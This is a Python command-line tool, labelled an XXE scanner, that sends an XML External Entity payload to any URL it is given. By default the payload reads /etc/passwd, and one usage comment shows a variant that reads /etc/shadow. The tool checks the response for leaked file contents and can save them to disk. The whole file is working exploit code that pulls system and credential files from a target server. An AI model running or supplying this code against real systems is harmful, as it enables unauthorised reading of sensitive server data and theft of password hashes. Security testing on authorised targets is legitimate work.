import argparse
import logging
import requests
import xml.etree.ElementTree as ET
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.
    """
    parser = argparse.ArgumentParser(description="Scans for XML External Entity (XXE) vulnerabilities.")
    parser.add_argument("url", help="The target URL to scan.")
    parser.add_argument("-p", "--payload", default="""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>""", help="The XXE payload to inject.  Default reads /etc/passwd")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output (debug logging).")
    parser.add_argument("-o", "--output", help="Output file to save the response to.")
    parser.add_argument("-m", "--method", default="POST", choices=["GET", "POST"], help="HTTP method to use (GET or POST). Default is POST.")
    parser.add_argument("-d", "--data", default="xml=<data>", help="Data parameter for the payload. Where the payload will be injected. Default is 'xml=<data>'")

    return parser.parse_args()


def is_valid_url(url):
    """
    Validates if the provided URL is valid.
    """
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False


def send_request(url, method, data, payload):
    """
    Sends the HTTP request with the crafted XML payload.
    """
    try:
        headers = {'Content-Type': 'application/xml'}

        if method == "GET":
            # Inject payload into URL parameters (if applicable) - Not ideal, but added for completeness.
            url = url + "?" + data.replace("<data>", payload)
            response = requests.get(url, headers=headers, timeout=10)
        else: # POST
            post_data = data.replace("<data>", payload)
            response = requests.post(url, data=post_data.encode('utf-8'), headers=headers, timeout=10)

        response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None


def analyze_response(response):
    """
    Analyzes the response for indicators of successful XXE exploitation.
    """
    if response and response.text:
        # Basic check for /etc/passwd contents.  Adapt as needed for other payloads.
        if "root:" in response.text:
            logging.warning("Possible XXE vulnerability detected: /etc/passwd content found in response.")
            return True
        else:
            logging.info("No immediate XXE indicators found.")
            return False
    else:
        logging.warning("Empty response received.  Unable to analyze.")
        return False


def save_output(response, output_file):
    """
    Saves the response content to a file.
    """
    try:
        with open(output_file, "w") as f:
            f.write(response.text)
        logging.info(f"Response saved to {output_file}")
    except IOError as e:
        logging.error(f"Error saving output to file: {e}")


def main():
    """
    Main function to orchestrate the XXE scanning process.
    """
    args = setup_argparse()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug("Verbose output enabled.")

    if not is_valid_url(args.url):
        logging.error("Invalid URL provided.")
        return

    logging.info(f"Starting XXE scan on {args.url}")

    response = send_request(args.url, args.method, args.data, args.payload)

    if response:
        if analyze_response(response):
            print("Possible XXE vulnerability detected!") # Keep this stdout for a simple output

        if args.output:
            save_output(response, args.output)
    else:
        logging.error("Scan failed due to request error.")


if __name__ == "__main__":
    # Example usage:
    # python main.py http://example.com/xml_endpoint
    # python main.py http://example.com/xml_endpoint -v
    # python main.py http://example.com/xml_endpoint -o output.txt
    # python main.py http://example.com/xml_endpoint -p "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><foo>&xxe;</foo>"
    # python main.py http://example.com/xml_endpoint -m GET
    # python main.py http://example.com/xml_endpoint -m POST -d "data=<data>"
    main()